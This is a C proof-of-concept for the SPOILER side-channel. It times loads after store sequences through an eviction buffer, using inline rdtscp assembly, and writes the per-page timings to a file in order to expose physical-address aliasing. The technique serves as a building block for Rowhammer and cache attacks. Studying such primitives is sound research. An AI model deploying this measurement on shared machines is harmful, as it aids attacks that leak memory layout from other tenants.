#include <stdio.h>
#include <stdint.h>			// uint64_t
#include <stdlib.h>			// For malloc
#include <string.h>			// For memset

#define ROUNDS 100
#define PAGE_COUNT 256 * (uint64_t)16 // ARG2 is the buffer size in MB
#define PAGE_SIZE 4096

// Measure_read
#define measure(_memory, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "rdtscp;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%eax;"\
   "rdtscp;"\
   "mfence;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)

int main(void)
{
	uint32_t tt = 0;
	uint64_t total = 0;
	
	// Allocating memories
	uint8_t * evictionBuffer;
	evictionBuffer = (uint8_t*) malloc(PAGE_COUNT * PAGE_SIZE);
	memset(evictionBuffer, 0, PAGE_COUNT * PAGE_SIZE);
	uint16_t * measurementBuffer;
	measurementBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));
	memset(measurementBuffer, 0, PAGE_COUNT * sizeof(uint16_t));
	
	// Warmup loop to avoid initial spike in timings
	for (int i = 0; i < 1000000; i++); 
	
	#define WINDOW 64
	#define THRESH_OUTLIER 2000	// Adjust after looking at outliers in t2.txt

	// SPOILER
	for (int p = WINDOW; p < PAGE_COUNT; p++)
	{
		total = 0;
		int cc = 0;
		for (int r = 0; r < ROUNDS; r++)		
		{
			for(int i = WINDOW; i >= 0; i--)
			{
				evictionBuffer[(p-i)*PAGE_SIZE] = 0;
			}
			measure(evictionBuffer, &tt);
			if (tt < THRESH_OUTLIER)
			{
				total = total + tt;
				cc++;
			}
		}
		if (cc != 0) {
			measurementBuffer[p] = total / cc;
		}
	}
	
	// Writing the timings into the file
	FILE *t2_file;
	t2_file = fopen("t2.txt", "w");
	for(int p = 0; p < PAGE_COUNT; p++)
		fprintf(t2_file, "%u\n", measurementBuffer[p]);
	fclose(t2_file);

    // Freeing Buffers
    free(evictionBuffer);
    free(measurementBuffer);
    return 1;
}
